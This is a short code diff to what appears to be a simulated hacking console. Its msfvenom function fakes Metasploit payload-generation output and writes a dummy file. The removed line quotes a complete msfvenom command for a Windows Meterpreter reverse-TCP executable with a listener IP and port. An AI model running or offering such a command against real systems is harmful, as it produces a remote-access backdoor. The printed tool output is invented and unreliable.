@@ -113,14 +113,16 @@ Example: cellbroad-attack http://sv.m03.pw/video/03.mp4'''
 
 def msfvenom(src: str):
 	src = ' '.join(src)
-	if src=='-p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe':
+	if '-p windows/meterpreter/reverse_tcp' in src:
 		print('File Created')
-		os.system('echo kekeke > back.exe')
+		os.system('echo kekeke > back.PPT')
 		return '''No platform was selected, choosing Msf: : m=Modoul: : Platform: :Windows from the paload
 No Arch selected, selecting Arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: 333bytes
 Final size of exe file: 73802 bytes'''
+	else:
+		return ''
 
 def msf(src: str):
 	return '[*] MSF Handler Started...'
